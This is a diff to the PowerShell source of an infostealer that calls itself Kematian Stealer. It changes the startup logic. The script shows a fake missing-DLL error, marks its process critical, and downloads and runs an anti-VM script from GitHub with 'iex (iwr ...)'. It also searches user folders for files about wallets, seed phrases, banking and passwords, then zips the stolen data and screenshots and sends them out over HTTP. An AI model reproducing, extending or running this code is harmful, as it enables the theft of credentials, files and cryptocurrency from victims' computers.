@@ -22,18 +22,16 @@ $avatar = "https://i.imgur.com/DOIYOtp.gif"
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
 function KDMUTEX {
-    if ($fakeerror ) {[Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
+    if ($fakeerror ) { [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
     $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running." }
     else {
-        if ($debug) {
-            Invoke-TASKS
+        if (($criticalprocess) -and (-not $debug)) {
+            [ProcessUtility]::MakeProcessCritical()
         }
-        else {
-            VMPROTECT
-        }
+        Invoke-TASKS
     }
 }
 
@@ -101,17 +99,8 @@ function Invoke-TASKS {
 }
 
 function VMPROTECT {
-    if ($criticalprocess) { 
-        $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
-        iex (iwr -uri $link -useb)
-        [ProcessUtility]::MakeProcessCritical()
-        Invoke-TASKS
-    }
-    else {
-        $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
-        iex (iwr -uri $link -useb)
-        Invoke-TASKS
-    }
+    $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+    iex (iwr -uri $link -useb)
 }
 
 
@@ -738,7 +727,7 @@ Pass: $decodedPass
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
-        $keywords = @("2fa","account","auth","backup","bank","binance","bitcoin","bitwarden","btc","casino","code","coinbase ","crypto","dashlane","discord","eth","exodus","facebook","funds","info","keepass","keys","kraken","kucoin","lastpass","ledger","login","mail","memo","metamask","mnemonic","nordpass","note","pass","passphrase","paypal","pgp","private","pw","recovery","remote","roboform","secret","seedphrase","server","skrill","smtp","solana","syncthing","tether","token","trading","trezor","venmo","vault","wallet")
+        $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
             $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
@@ -1099,7 +1088,7 @@ FileZilla: $filezilla_info
 
     # Send screenshot
     $messageContent = @{content = "## :desktop: Screenshot"; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
-    $httpClient = [Net.Http.HttpClient]::new();$multipartContent = [Net.Http.MultipartFormDataContent]::new()
+    $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new()
     $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
     $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
     $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
@@ -1110,7 +1099,7 @@ FileZilla: $filezilla_info
 
     # Send exfiltrated data
     $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
-    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName";Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
+    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"; Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
     $messageContent = @{username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json
     $httpClient = [Net.Http.HttpClient]::new(); $multipartContent = [Net.Http.MultipartFormDataContent]::new(); $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
     $messageContentStream = [IO.MemoryStream]::new(); $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0
@@ -1124,6 +1113,8 @@ FileZilla: $filezilla_info
     Remove-Item "$zipFilePath" -Force
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
+
+VMPROTECT
 
 if (CHECK_AND_PATCH -eq $true) {
     KDMUTEX
